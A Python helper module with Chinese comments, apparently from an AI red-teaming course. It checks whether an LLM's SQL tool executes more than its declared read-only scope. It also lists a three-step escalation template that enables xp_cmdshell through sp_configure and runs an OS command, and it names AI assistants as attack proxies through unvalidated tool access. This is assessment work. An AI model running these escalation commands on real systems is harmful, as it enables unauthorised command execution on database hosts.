#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""工具校验落差判定 + SQL→OS 升级模板（Ch3 · 模板 4）。

零 PyRIT、零 I/O 的叶子辅助：比较工具「声明权限」与「实际执行」，输出三态判定；
给出受限 SQL 工具升级到 OS 命令的示意步骤（命令模板标注来源，不伪造目标回显）。
锚点：Ch3 L212（无二次校验）、L212-229（两次 sp_configure → xp_cmdshell）、
L231-264（OS 确认与 shell）、L285（单一 AI 弱点归因）。
"""
from typing import Dict, List, Optional, Tuple


def assess_validation_gap(declared_scope: str, observed_actions: List[str],
                          evidence_available: bool = True) -> Dict[str, str]:
    """判定 LLM 决策与工具执行之间是否存在二次校验（三态，不臆断）。

    - 有落差：声明权限明显窄于实际执行（如声明只读却执行 sp_configure）。
    - 无落差：实际执行均在声明范围内。
    - UNDETERMINED：无证据或权限信息不足。
    """
    if not evidence_available or not declared_scope or not observed_actions:
        return {"verdict": "UNDETERMINED",
                "reason": "证据或权限信息不足，不臆断校验落差"}
    scope = declared_scope.lower()
    read_only = any(k in scope for k in ("read", "只读", "select", "查询"))
    privileged = any(
        any(k in a.lower() for k in ("sp_configure", "xp_cmdshell", "drop", "exec", "命令"))
        for a in observed_actions)
    if read_only and privileged:
        return {"verdict": "有落差",
                "reason": "工具声明只读/查询，实际执行特权语句（Ch3 L212 无二次校验）"}
    return {"verdict": "无落差", "reason": "实际执行未超出声明权限范围"}


def sql_to_os_escalation() -> Tuple[Dict[str, str], ...]:
    """受限 SQL 工具 → OS 命令的分步升级模板（每步含命令模板与来源标注）。

    示意命令，执行前须经 RoE 确认；不伪造目标回显，须以证据片段记录真实输出。
    """
    return (
        {"step": "1", "action": "启用高级选项",
         "command": "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;",
         "source": "Ch3 Listing 7 (L212-229)", "verify": "回显须记录原文，不伪造"},
        {"step": "2", "action": "启用 xp_cmdshell",
         "command": "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
         "source": "Ch3 Listing 7 (L212-229)", "verify": "回显须记录原文，不伪造"},
        {"step": "3", "action": "OS 确认",
         "command": "EXEC xp_cmdshell 'ver'",
         "source": "Ch3 L231-264", "verify": "确认 OS 后再选 payload；结果记入证据"},
    )


def no_gap_downgrade_advice() -> str:
    """无落差时的降级建议：转 D7（MCP 工具面），沿用 SKILL.md 降级逻辑。"""
    return "工具执行存在二次校验（无落差）：如实记录，转 D7 MCP 工具面评估其他入口"


def root_cause_attribution() -> str:
    """单一 AI 弱点归因（Ch3 L285）。"""
    return "unvalidated tool access（未校验的工具访问）：AI 助手作为攻击代理，传统配置放大影响"
